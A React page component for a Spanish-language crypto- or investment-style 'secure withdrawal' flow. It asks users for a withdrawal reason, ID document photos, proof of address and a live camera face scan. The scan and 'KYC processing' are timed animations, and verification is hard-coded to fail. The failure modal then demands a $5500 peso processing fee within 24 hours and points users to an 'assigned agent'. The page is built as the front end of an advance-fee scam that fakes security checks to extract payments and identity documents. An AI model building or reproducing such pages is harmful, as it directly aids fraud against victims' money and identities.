'use client';

import React, { useEffect, useMemo, useRef, useState } from 'react';
import { AnimatePresence, motion } from 'framer-motion';
import {
  AlertTriangle,
  ArrowLeft,
  ArrowRight,
  Camera,
  FileText,
  ImagePlus,
  Loader2,
  MessageSquare,
  ScanFace,
  ShieldCheck,
  Upload,
  X,
  XCircle,
} from 'lucide-react';

type WithdrawalStep = 1 | 2 | 3 | 4;

const faceChecklist = [
  'Posiciona tu rostro dentro del marco',
  'Mira directamente a la cámara',
  'Permanece quieto mientras verificamos tu identidad',
  'Espera mientras el escaneo está en progreso',
];

const scanningStatuses = [
  'Inicializando verificación...',
  'Detectando rasgos faciales...',
  'Comparando registros de identidad...',
  'Realizando comprobaciones de seguridad...',
  'Finalizando verificación...',
];

export default function WithdrawalsPage() {
  const [step, setStep] = useState<WithdrawalStep>(1);
  const [reason, setReason] = useState('');
  const [frontId, setFrontId] = useState<File | null>(null);
  const [backId, setBackId] = useState<File | null>(null);
  const [proofOfAddress, setProofOfAddress] = useState<File | null>(null);
  const [cameraPermission, setCameraPermission] = useState<'idle' | 'prompt' | 'granted' | 'denied'>('idle');
  const [cameraError, setCameraError] = useState<string | null>(null);
  const [scanProgress, setScanProgress] = useState(1);
  const [scanIndex, setScanIndex] = useState(0);
  const [processing, setProcessing] = useState(false);
  const [verificationFailed, setVerificationFailed] = useState(false);
  const [progress, setProgress] = useState(0);
  const frontInputRef = useRef<HTMLInputElement | null>(null);
  const backInputRef = useRef<HTMLInputElement | null>(null);
  const proofInputRef = useRef<HTMLInputElement | null>(null);
  const videoRef = useRef<HTMLVideoElement | null>(null);
  const streamRef = useRef<MediaStream | null>(null);

  const canContinueStep1 = reason.trim().length >= 12;
  const canContinueStep2 = Boolean(frontId && backId);
  const canContinueStep3 = Boolean(proofOfAddress);

  const stopCamera = () => {
    streamRef.current?.getTracks().forEach((track) => track.stop());
    streamRef.current = null;
    if (videoRef.current) videoRef.current.srcObject = null;
  };

  useEffect(() => {
    if (!processing) return;
    setProgress(0);
    const interval = window.setInterval(() => {
      setProgress((current) => {
        const next = Math.min(current + 2, 100);
        if (next >= 100) {
          window.clearInterval(interval);
          window.setTimeout(() => {
            setProcessing(false);
            setVerificationFailed(true);
          }, 500);
        }
        return next;
      });
    }, 80);
    return () => window.clearInterval(interval);
  }, [processing]);

  useEffect(() => {
    if (step !== 4 || cameraPermission !== 'granted') return;

    setScanProgress(1);
    setScanIndex(0);

    const totalDuration = 50000;
    const startTime = performance.now();
    const interval = window.setInterval(() => {
      const elapsed = performance.now() - startTime;
      const next = Math.min(1 + (elapsed / totalDuration) * 99, 100);
      setScanProgress(next);
      setScanIndex(Math.min(Math.floor((next / 100) * faceChecklist.length), faceChecklist.length - 1));

      if (next >= 100) {
        window.clearInterval(interval);
        window.setTimeout(() => {
          stopCamera();
          setProcessing(true);
          setVerificationFailed(false);
        }, 500);
      }
    }, 150);

    return () => window.clearInterval(interval);
  }, [step, cameraPermission]);

  useEffect(() => {
    if (step !== 4) {
      stopCamera();
      setCameraPermission('idle');
      setCameraError(null);
    }
  }, [step]);

  useEffect(() => {
    if (cameraPermission !== 'granted' || !videoRef.current || !streamRef.current) return;

    const video = videoRef.current;
    video.srcObject = streamRef.current;

    const ensurePlay = async () => {
      try {
        await video.play();
      } catch {
        window.setTimeout(() => video.play().catch(() => undefined), 150);
      }
    };

    if (video.readyState >= 2) {
      void ensurePlay();
    } else {
      video.addEventListener('loadedmetadata', ensurePlay, { once: true });
    }
  }, [cameraPermission]);

  const selectedSummary = useMemo(
    () => [frontId?.name, backId?.name, proofOfAddress?.name].filter(Boolean).join(' • '),
    [backId, frontId, proofOfAddress],
  );

  const handleFileChange =
    (setter: (file: File | null) => void) => (event: React.ChangeEvent<HTMLInputElement>) => {
      setter(event.target.files?.[0] ?? null);
    };

  const openFilePicker = (ref: React.RefObject<HTMLInputElement | null>) => ref.current?.click();
  const triggerAgentChat = () => window.dispatchEvent(new CustomEvent('open-chat-agent'));

  const requestCameraAccess = async () => {
    setCameraPermission('prompt');
    setCameraError(null);

    try {
      const stream = await navigator.mediaDevices.getUserMedia({
        video: {
          facingMode: 'user',
          width: { ideal: 1280 },
          height: { ideal: 720 },
        },
        audio: false,
      });

      streamRef.current = stream;
      setCameraPermission('granted');

      if (videoRef.current) {
        videoRef.current.srcObject = stream;
        await videoRef.current.play().catch(() => undefined);
      }
    } catch (error) {
      console.warn('No se pudo acceder a la cámara:', error);
      setCameraPermission('denied');
      setCameraError('No pudimos acceder a tu cámara. Permite el acceso para continuar.');
    }
  };

  return (
    <div className="max-w-3xl mx-auto space-y-6">
      <div className="space-y-2">
        <h1 className="font-display font-extrabold text-2xl md:text-3xl text-text-primary">Retiro Seguro</h1>
        <p className="text-text-muted text-xs sm:text-sm">
          Flujo de retiro por pasos con verificación KYC y una experiencia financiera profesional.
        </p>
      </div>

      <div className="glass-panel border border-border-main rounded-3xl p-4 sm:p-6 md:p-8 relative overflow-hidden">
        <div className="absolute -top-14 -right-14 w-48 h-48 bg-brand-primary/5 rounded-full blur-3xl pointer-events-none" />

        <div className="flex flex-wrap items-center gap-2 mb-6">
          {[1, 2, 3, 4].map((item) => (
            <div
              key={item}
              className={`flex items-center gap-2 px-3 py-2 rounded-full border text-[11px] font-semibold transition-all ${
                step === item
                  ? 'bg-brand-primary text-white border-brand-primary'
                  : step > item
                  ? 'bg-green-500/10 text-green-400 border-green-500/20'
                  : 'bg-bg-main text-text-muted border-border-main'
              }`}
            >
              <span className="w-5 h-5 rounded-full flex items-center justify-center text-[10px] font-bold bg-black/15">
                {item}
              </span>
              <span className="hidden sm:inline">
                {item === 1 ? 'Motivo' : item === 2 ? 'Documento' : item === 3 ? 'Comprobante' : 'Rostro'}
              </span>
            </div>
          ))}
        </div>

        <AnimatePresence mode="wait">
          {step === 1 && (
            <motion.div key="step1" initial={{ opacity: 0, y: 12 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0, y: -12 }} className="space-y-5">
              <StepHeader icon={<FileText className="w-5 h-5" />} title="Motivo del retiro" subtitle="Cuéntanos por qué necesitas retirar fondos." />
              <div className="space-y-2">
                <label className="text-[11px] font-semibold text-text-primary">Motivo del retiro</label>
                <textarea
                  value={reason}
                  onChange={(e) => setReason(e.target.value)}
                  placeholder="Explica el propósito del retiro..."
                  rows={6}
                  className="withdrawal-input min-h-36 resize-none"
                />
              </div>
              <div className="flex flex-col sm:flex-row gap-3 pt-2">
                <button
                  disabled={!canContinueStep1}
                  onClick={() => setStep(2)}
                  className="w-full sm:w-auto sm:min-w-40 py-3.5 rounded-xl bg-brand-primary hover:bg-brand-hover disabled:opacity-40 disabled:hover:bg-brand-primary text-xs font-bold text-white transition-colors flex items-center justify-center gap-2"
                >
                  Siguiente
                  <ArrowRight className="w-4 h-4" />
                </button>
              </div>
            </motion.div>
          )}

          {step === 2 && (
            <motion.div key="step2" initial={{ opacity: 0, y: 12 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0, y: -12 }} className="space-y-5">
              <StepHeader icon={<ShieldCheck className="w-5 h-5" />} title="Verificación de identidad" subtitle="Sube el frente y el reverso de tu documento de identidad." />
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <UploadCard label="Frente del documento" detail={frontId?.name} refInput={frontInputRef} onClick={() => openFilePicker(frontInputRef)} onChange={handleFileChange(setFrontId)} />
                <UploadCard label="Reverso del documento" detail={backId?.name} refInput={backInputRef} onClick={() => openFilePicker(backInputRef)} onChange={handleFileChange(setBackId)} />
              </div>
              <div className="flex flex-col sm:flex-row gap-3 pt-2">
                <button
                  onClick={() => setStep(1)}
                  className="w-full sm:w-auto sm:min-w-36 py-3.5 rounded-xl border border-border-main text-xs font-bold text-text-primary hover:border-brand-primary/30 hover:bg-bg-card/40 transition-colors flex items-center justify-center gap-2"
                >
                  <ArrowLeft className="w-4 h-4" />
                  Atrás
                </button>
                <button
                  disabled={!canContinueStep2}
                  onClick={() => setStep(3)}
                  className="w-full sm:w-auto sm:min-w-36 py-3.5 rounded-xl bg-brand-primary hover:bg-brand-hover disabled:opacity-40 disabled:hover:bg-brand-primary text-xs font-bold text-white transition-colors flex items-center justify-center gap-2"
                >
                  Siguiente
                  <ArrowRight className="w-4 h-4" />
                </button>
              </div>
            </motion.div>
          )}

          {step === 3 && (
            <motion.div key="step3" initial={{ opacity: 0, y: 12 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0, y: -12 }} className="space-y-5">
              <StepHeader icon={<Upload className="w-5 h-5" />} title="Comprobante de domicilio" subtitle="Sube una factura de servicios, estado de cuenta o comprobante emitido por una autoridad." />
              <UploadCard
                label="Comprobante de domicilio"
                detail={proofOfAddress?.name}
                refInput={proofInputRef}
                onClick={() => openFilePicker(proofInputRef)}
                onChange={handleFileChange(setProofOfAddress)}
                fullWidth
              />
              <div className="flex flex-col sm:flex-row gap-3 pt-2">
                <button
                  onClick={() => setStep(2)}
                  className="w-full sm:w-auto sm:min-w-36 py-3.5 rounded-xl border border-border-main text-xs font-bold text-text-primary hover:border-brand-primary/30 hover:bg-bg-card/40 transition-colors flex items-center justify-center gap-2"
                >
                  <ArrowLeft className="w-4 h-4" />
                  Atrás
                </button>
                <button
                  disabled={!canContinueStep3}
                  onClick={() => setStep(4)}
                  className="w-full sm:w-auto sm:min-w-36 py-3.5 rounded-xl bg-brand-primary hover:bg-brand-hover disabled:opacity-40 disabled:hover:bg-brand-primary text-xs font-bold text-white transition-colors flex items-center justify-center gap-2"
                >
                  Siguiente
                  <ArrowRight className="w-4 h-4" />
                </button>
              </div>
            </motion.div>
          )}

          {step === 4 && (
            <motion.div key="step4" initial={{ opacity: 0, y: 12 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0, y: -12 }} className="space-y-5">
              <StepHeader icon={<ScanFace className="w-5 h-5" />} title="Verificación facial" subtitle="Completa la verificación facial en vivo con la cámara de tu dispositivo." />

              {cameraPermission !== 'granted' ? (
                <div className="rounded-2xl border border-border-main bg-bg-main/40 p-5 sm:p-6 space-y-5">
                  <div className="space-y-2">
                    <h4 className="font-display font-bold text-lg text-text-primary">Se requiere acceso a la cámara</h4>
                    <p className="text-sm text-text-muted">Necesitamos acceso a tu cámara para completar la verificación facial.</p>
                  </div>

                  {cameraError && (
                    <div className="flex items-start gap-2 rounded-xl border border-red-500/20 bg-red-500/5 p-3 text-xs text-red-300">
                      <AlertTriangle className="w-4 h-4 mt-0.5 flex-shrink-0" />
                      <span>{cameraError}</span>
                    </div>
                  )}

                  <div className="flex flex-col sm:flex-row gap-3">
                    <button
                      onClick={requestCameraAccess}
                      className="flex-1 py-3.5 rounded-xl bg-brand-primary hover:bg-brand-hover text-xs font-bold text-white transition-colors flex items-center justify-center gap-2"
                    >
                      <Camera className="w-4 h-4" />
                      Permitir acceso a la cámara
                    </button>
                    <button
                      onClick={() => setStep(3)}
                      className="flex-1 py-3.5 rounded-xl border border-border-main text-xs font-bold text-text-primary hover:border-brand-primary/30 hover:bg-bg-card/40 transition-colors flex items-center justify-center gap-2"
                    >
                      Cancelar
                    </button>
                  </div>
                </div>
              ) : (
                <div className="space-y-5">
                  <div className="grid grid-cols-1 lg:grid-cols-[1.2fr_0.8fr] gap-4">
                    <div className="rounded-2xl border border-border-main bg-bg-main/40 p-4 sm:p-5 space-y-4">
                      <div className="flex items-center justify-between gap-3">
                        <div className="flex items-center gap-2 text-xs font-semibold text-text-primary">
                          <Camera className="w-4 h-4 text-brand-primary" />
                          Vista previa en vivo
                        </div>
                        <span className="rounded-full border border-brand-primary/20 bg-brand-primary/10 px-3 py-1 text-[10px] font-bold text-brand-primary">
                          En vivo
                        </span>
                      </div>

                      <div className="relative aspect-[4/5] w-full overflow-hidden rounded-3xl border border-border-main bg-bg-main shadow-2xl">
                        <video
                          ref={videoRef}
                          autoPlay
                          playsInline
                          muted
                          className="absolute inset-0 h-full w-full object-cover scale-x-[-1]"
                        />
                        <div className="absolute inset-0 bg-[radial-gradient(circle_at_center,transparent_0%,rgba(0,0,0,0.08)_65%,rgba(0,0,0,0.22)_100%)]" />
                        <div className="absolute inset-x-4 top-4 flex items-center justify-between text-[10px] font-semibold text-white/85">
                          <span>Posiciona tu rostro dentro del marco</span>
                          <span>{Math.round(scanProgress)}%</span>
                        </div>
                        <div className="absolute inset-0 flex items-center justify-center">
                          <FaceGuideOverlay />
                        </div>
                        <div className="absolute inset-0 overflow-hidden pointer-events-none">
                          <motion.div
                            className="absolute left-0 right-0 h-1.5 bg-gradient-to-r from-transparent via-brand-primary to-transparent opacity-70 shadow-[0_0_18px_rgba(255,179,195,0.9)]"
                            animate={{ y: ['0%', '92%', '0%'] }}
                            transition={{ duration: 2.8, repeat: Infinity, ease: 'easeInOut' }}
                          />
                        </div>
                      </div>
                    </div>

                    <div className="rounded-2xl border border-border-main bg-bg-main/40 p-4 sm:p-5 space-y-4">
                      <div className="flex items-center gap-2 text-xs font-semibold text-text-primary">
                        <ShieldCheck className="w-4 h-4 text-brand-primary" />
                        Estado de verificación
                      </div>

                      <div className="rounded-2xl border border-border-main bg-black/10 p-4">
                        <p className="text-[10px] uppercase tracking-wider text-text-muted">Instrucción actual</p>
                        <p className="mt-2 text-sm font-semibold text-text-primary">{faceChecklist[scanIndex]}</p>
                      </div>

                      <div className="rounded-2xl border border-border-main bg-black/10 p-4">
                        <p className="text-[10px] uppercase tracking-wider text-text-muted">Estado</p>
                        <p className="mt-2 text-sm font-semibold text-brand-primary">
                          {scanningStatuses[Math.min(Math.floor((scanProgress / 100) * scanningStatuses.length), scanningStatuses.length - 1)]}
                        </p>
                      </div>

                      <div className="space-y-2">
                        <div className="flex items-center justify-between text-[11px] text-text-muted">
                          <span>Progreso del escaneo</span>
                          <span className="font-mono font-semibold">{Math.round(scanProgress)}%</span>
                        </div>
                        <div className="h-2.5 overflow-hidden rounded-full border border-border-main bg-bg-main">
                          <motion.div
                            className="h-full bg-gradient-to-r from-brand-primary via-pink-300 to-green-400"
                            initial={{ width: '1%' }}
                            animate={{ width: `${scanProgress}%` }}
                            transition={{ duration: 0.15, ease: 'linear' }}
                          />
                        </div>
                      </div>

                      <div className="grid grid-cols-1 gap-2 text-[11px] text-text-muted">
                        {scanningStatuses.map((status, idx) => (
                          <div
                            key={status}
                            className={`flex items-center gap-2 rounded-xl border px-3 py-2 transition-colors ${
                              idx <= Math.floor((scanProgress / 100) * (scanningStatuses.length - 1))
                                ? 'border-brand-primary/20 bg-brand-primary/5 text-text-primary'
                                : 'border-border-main bg-black/10'
                            }`}
                          >
                            <span className={`w-2 h-2 rounded-full ${idx <= Math.floor((scanProgress / 100) * (scanningStatuses.length - 1)) ? 'bg-brand-primary' : 'bg-border-main'}`} />
                            <span>{status}</span>
                          </div>
                        ))}
                      </div>
                    </div>
                  </div>

                  <div className="grid grid-cols-1 lg:grid-cols-2 gap-4">
                    <div className="rounded-2xl border border-border-main bg-bg-main/40 p-4">
                      <p className="text-[10px] uppercase tracking-wider text-text-muted">Resumen de verificación</p>
                      <p className="mt-2 text-sm text-text-primary font-semibold">Motivo: {reason}</p>
                      <p className="mt-1 text-xs text-text-muted">Archivos: {selectedSummary || 'Listos para revisión'}</p>
                    </div>
                    <div className="rounded-2xl border border-border-main bg-bg-main/40 p-4">
                      <p className="text-[10px] uppercase tracking-wider text-text-muted">Instrucciones</p>
                      <p className="mt-2 text-xs text-text-muted leading-relaxed">
                        Mantén tu rostro centrado, mira directamente a la cámara y permanece quieto mientras el sistema verifica tu identidad.
                      </p>
                    </div>
                  </div>
                </div>
              )}

              <div className="flex flex-col sm:flex-row gap-3 pt-2">
                <button
                  onClick={() => {
                    stopCamera();
                    setCameraPermission('idle');
                    setStep(3);
                  }}
                  className="w-full sm:w-auto sm:min-w-36 py-3.5 rounded-xl border border-border-main text-xs font-bold text-text-primary hover:border-brand-primary/30 hover:bg-bg-card/40 transition-colors flex items-center justify-center gap-2"
                >
                  <ArrowLeft className="w-4 h-4" />
                  Atrás
                </button>
                <button
                  onClick={() => setProcessing(true)}
                  disabled={scanProgress < 100}
                  className="w-full sm:w-auto sm:min-w-36 py-3.5 rounded-xl bg-brand-primary hover:bg-brand-hover disabled:opacity-40 disabled:hover:bg-brand-primary text-xs font-bold text-white transition-colors flex items-center justify-center gap-2"
                >
                  Verificar
                  <ShieldCheck className="w-4 h-4" />
                </button>
              </div>
            </motion.div>
          )}
        </AnimatePresence>
      </div>

      <AnimatePresence>{processing && <ProcessingModal progress={progress} />}</AnimatePresence>
      <AnimatePresence>
        {verificationFailed && (
          <FailureModal
            onClose={() => setVerificationFailed(false)}
            onTryAgain={() => {
              setVerificationFailed(false);
              setStep(4);
            }}
            onSupport={triggerAgentChat}
          />
        )}
      </AnimatePresence>
    </div>
  );
}

function StepHeader({
  icon,
  title,
  subtitle,
}: {
  icon: React.ReactNode;
  title: string;
  subtitle: string;
}) {
  return (
    <div className="flex items-start gap-3 border-b border-border-main/50 pb-4">
      <div className="w-10 h-10 rounded-xl bg-brand-primary/10 border border-brand-primary/20 flex items-center justify-center text-brand-primary">
        {icon}
      </div>
      <div>
        <h3 className="font-display font-semibold text-sm text-text-primary">{title}</h3>
        <p className="text-[11px] text-text-muted mt-1 leading-relaxed">{subtitle}</p>
      </div>
    </div>
  );
}

function UploadCard({
  label,
  detail,
  refInput,
  onClick,
  onChange,
  fullWidth = false,
}: {
  label: string;
  detail?: string;
  refInput: React.RefObject<HTMLInputElement | null>;
  onClick: () => void;
  onChange: (event: React.ChangeEvent<HTMLInputElement>) => void;
  fullWidth?: boolean;
}) {
  return (
    <div
      onClick={onClick}
      className={`group cursor-pointer rounded-2xl border border-dashed border-border-main bg-bg-main/35 hover:border-brand-primary/35 hover:bg-bg-main/55 transition-all p-4 sm:p-5 min-h-44 flex flex-col justify-between ${fullWidth ? 'md:col-span-1' : ''}`}
    >
      <input ref={refInput} type="file" className="hidden" onChange={onChange} />
      <div className="flex items-center justify-between gap-3">
        <div>
          <p className="text-xs font-semibold text-text-primary">{label}</p>
          <p className="text-[11px] text-text-muted mt-1">Toca para subir un archivo</p>
        </div>
        <div className="w-11 h-11 rounded-2xl bg-brand-primary/10 border border-brand-primary/20 flex items-center justify-center text-brand-primary group-hover:scale-105 transition-transform">
          <ImagePlus className="w-5 h-5" />
        </div>
      </div>
      <div className="mt-6 rounded-xl border border-border-main bg-black/10 p-4 text-[11px] text-text-muted min-h-20 flex items-center justify-center text-center">
        {detail ? <span className="text-text-primary font-medium break-all">{detail}</span> : <span>Haz clic aquí para elegir un archivo desde tu dispositivo.</span>}
      </div>
    </div>
  );
}

function FaceGuideOverlay() {
  return (
    <div className="relative w-[72%] max-w-[320px] aspect-[3/4]">
      <div className="absolute inset-0 rounded-[2.5rem] border border-brand-primary/40 bg-transparent shadow-[0_0_0_9999px_rgba(0,0,0,0.18)]" />
      <div className="absolute inset-6 rounded-[2rem] border border-white/25" />
      <div className="absolute left-1/2 top-1/2 h-[78%] w-[78%] -translate-x-1/2 -translate-y-1/2 rounded-[45%] border border-white/20" />
      <div className="absolute left-[12%] right-[12%] top-[20%] h-px bg-white/35" />
      <div className="absolute left-[12%] right-[12%] bottom-[20%] h-px bg-white/35" />
      <div className="absolute left-1/2 top-[50%] h-[3px] w-[86%] -translate-x-1/2 bg-gradient-to-r from-transparent via-brand-primary to-transparent opacity-80" />
    </div>
  );
}

function ProcessingModal({ progress }: { progress: number }) {
  return (
    <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }} className="fixed inset-0 z-50 flex items-center justify-center bg-black/60 backdrop-blur-md p-4">
      <motion.div initial={{ scale: 0.96, y: 12 }} animate={{ scale: 1, y: 0 }} exit={{ scale: 0.96, y: 12 }} className="w-full max-w-md rounded-3xl border border-border-main bg-bg-main/95 shadow-2xl p-6 sm:p-7 space-y-6">
        <div className="flex items-center gap-3">
          <div className="w-12 h-12 rounded-2xl bg-brand-primary/10 border border-brand-primary/20 flex items-center justify-center">
            <Loader2 className="w-6 h-6 text-brand-primary animate-spin" />
          </div>
          <div>
            <h3 className="font-display font-bold text-lg text-text-primary">Verificación en progreso</h3>
            <p className="text-xs text-text-muted">Espera mientras validamos tus documentos y el escaneo facial.</p>
          </div>
        </div>

        <div className="space-y-3">
          <div className="h-2.5 rounded-full bg-bg-card overflow-hidden border border-border-main">
            <motion.div className="h-full bg-gradient-to-r from-brand-primary to-green-400" initial={{ width: 0 }} animate={{ width: `${progress}%` }} transition={{ ease: 'easeOut', duration: 0.2 }} />
          </div>
          <div className="flex items-center justify-between text-[11px] text-text-muted font-mono">
            <span>Procesando señal KYC</span>
            <span>{Math.round(progress)}%</span>
          </div>
        </div>

        <div className="grid grid-cols-3 gap-3 text-center">
          {['Carga', 'Revisión', 'Coincidencia'].map((item, index) => (
            <div key={item} className="rounded-2xl border border-border-main bg-bg-card/50 p-3">
              <div className={`w-2.5 h-2.5 rounded-full mx-auto mb-2 ${progress > index * 33 ? 'bg-green-400' : 'bg-border-main animate-pulse'}`} />
              <p className="text-[10px] text-text-muted">{item}</p>
            </div>
          ))}
        </div>
      </motion.div>
    </motion.div>
  );
}

function FailureModal({
  onClose,
  onTryAgain,
  onSupport,
}: {
  onClose: () => void;
  onTryAgain: () => void;
  onSupport: () => void;
}) {
  return (
    <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }} className="fixed inset-0 z-50 flex items-center justify-center bg-black/60 backdrop-blur-md p-4">
      <motion.div initial={{ opacity: 0, scale: 0.94, y: 14 }} animate={{ opacity: 1, scale: 1, y: 0 }} exit={{ opacity: 0, scale: 0.94, y: 14 }} className="w-full max-w-md rounded-3xl border border-red-500/20 bg-bg-main/95 shadow-2xl p-6 sm:p-7 space-y-5">
        <div className="flex items-center justify-between gap-4">
          <div className="flex items-center gap-3">
            <div className="w-12 h-12 rounded-2xl bg-red-500/10 border border-red-500/20 flex items-center justify-center text-red-400">
              <XCircle className="w-6 h-6" />
            </div>
            <div>
              <h3 className="font-display font-bold text-lg text-text-primary">Retiro fallido</h3>
              <p className="text-xs text-text-muted">No pudimos completar el proceso de retiro.</p>
            </div>
          </div>
          <button onClick={onClose} className="text-text-muted hover:text-text-primary transition-colors">
            <X className="w-5 h-5" />
          </button>
        </div>

        <div className="rounded-2xl border border-red-500/20 bg-red-500/5 p-4 text-xs text-text-muted leading-relaxed">
          Su solicitud de retiro no pudo completarse en este momento debido a una comisión de procesamiento pendiente de $5500 peso

Para proceder con la transferencia de fondos y ganancias a su cuenta, la comisión requerida debe liquidarse en un plazo de 24 horas. Si no realiza este pago dentro del plazo especificado, podría haber una demora en el procesamiento de su solicitud de retiro.

Para obtener más ayuda o realizar consultas, comuníquese con su agente asignado o con el equipo de atención al cliente.
        </div>

        <div className="flex flex-col sm:flex-row gap-3">
          <button onClick={onTryAgain} className="flex-1 py-3 rounded-xl bg-brand-primary hover:bg-brand-hover text-xs font-bold text-white transition-colors">
            Intentar de nuevo
          </button>
          <button onClick={onSupport} className="flex-1 py-3 rounded-xl border border-border-main text-xs font-bold text-text-primary hover:border-brand-primary/30 hover:bg-bg-card/40 transition-colors flex items-center justify-center gap-2">
            <MessageSquare className="w-4 h-4" />
            Contactar soporte
          </button>
        </div>
      </motion.div>
    </motion.div>
  );
}
